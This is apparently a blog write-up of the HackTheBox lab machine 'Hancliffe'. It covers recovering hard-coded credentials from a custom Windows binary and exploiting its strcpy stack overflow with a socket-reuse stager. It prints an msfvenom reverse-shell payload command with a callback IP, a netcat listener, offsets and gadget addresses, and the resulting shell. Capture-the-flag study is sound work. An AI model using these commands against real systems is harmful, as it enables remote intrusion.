---
title: "Hancliffe"
date: 2026-12-21 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, hard, buffer-overflow, socket-reuse, binary-exploitation, reverse-engineering, msfvenom]
image:
    path: /assets/Images/hancliffe-002_foothold_shell.png
    width: 300
    height: 300
description: "A custom network application on port 9999 trusts a hard-coded login and copies user input into a fixed stack buffer with strcpy. We recover the obfuscated credentials from the binary, overflow the buffer, and use a socket-reuse stager to slip a full reverse-shell payload through the program's own recv() call — landing a privileged shell straight from the network."
---

## Overview

Hancliffe is a hard Windows machine. Three services face the network: an Nginx server on 80, a "H@$hPa$$" password-manager API on 8000, and a custom application called *Brankas* on 9999. This post takes the binary-exploitation route: the port-9999 app has a classic stack buffer overflow guarded only by credentials hard-coded in the executable. We decode those credentials, overrun the buffer, and use a socket-reuse technique to fit a real reverse shell — reaching a shell and the user flag without touching the web stack.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,106.0 191.8,136.4 150.0,150.0 85.3,239.0 87.2,129.6" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Pure binary-exploitation foothold: reverse the obfuscated creds, overflow a strcpy buffer, and hand-write a socket-reuse stager, making custom exploitation the overwhelmingly dominant axis with no CVE and thin enumeration.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 80   | http (Nginx) | default welcome page |
| 8000 | http-alt | H@$hPa$$ stateless password manager |
| 9999 | custom | "Brankas" login application |

```bash
nmap -p- --min-rate=1000 -T4 10.129.96.116
nmap -p80,8000,9999 -sV -sC -Pn 10.129.96.116
```

Port 9999 stands out — it's not a standard service. Connecting to it shows a banner and a login prompt:

```
Welcome Brankas Application.
Username:
```

## Enumeration

The Brankas binary can be retrieved from the host (it lives in `C:\DevApp\MyFirstApp.exe`) and opened in a disassembler. Two functions matter:

- `_login()` compares the supplied username against a hard-coded string `alfiansyah`, and the password against a hard-coded value `YXlYeDtsbD98eDtsWms5SyU=` after running it through two custom transforms and Base64. Reversing those transforms (ROT47 → Atbash → Base64, applied in reverse) recovers the plaintext password.
- `_SaveCreds()` copies attacker input into a 50-byte stack buffer with `strcpy()` and no length check — a textbook stack overflow.

So we have valid credentials and an overflow primitive behind them.

## Foothold

The reverse-shell shellcode is generated as raw bytes (no framework, just the payload):

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.13 LPORT=9999 EXITFUNC=thread -b "\x00" -f python -v shellcode
```

![msfvenom shellcode](/assets/Images/hancliffe-001_exploit_msfvenom.png)

The overflow overwrites the saved return address at offset **66**, and a `jmp esp` gadget at `0x719023a8` redirects execution onto the stack. The catch: the space at ESP is tiny — far too small for a full payload. The fix is **socket reuse**: jump backward (`\xeb\xb8`) into a small hand-written stub that calls the program's own `recv()` (at `0x719082ac`) to pull the real shellcode into a larger buffer over the connection that is already open, then runs it.

A FIFO-backed listener lets us drive the resulting non-interactive shell:

```bash
mkfifo /tmp/hc.fifo; : > /tmp/hc_cmds.txt
tail -f /tmp/hc_cmds.txt | nc -lvnp 9999 > shell.log
```

The exploit logs in with the recovered credentials, sends the overflow plus stager, then sends the shellcode through the reused socket. The login on this app is a little racy (the service also restarts on a timer), so the script retries until it sees `Login Successfully!` before firing the payload:

```bash
python3 sploit.py 10.129.96.116 9999
```

A shell connects back:

```
connect to [10.10.16.13] from (UNKNOWN) [10.129.96.116]
Microsoft Windows [Version 10.0.19043.1266]
C:\Windows\system32>whoami
```

![reverse shell](/assets/Images/hancliffe-002_foothold_shell.png)

## User flag

```bash
type C:\Users\clara\Desktop\user.txt   # HTB{...}
```

Shell obtained and the user flag captured.

Privilege escalation is left as an exercise — this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/Hancliffe-avatar.png" alt="Hancliffe" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
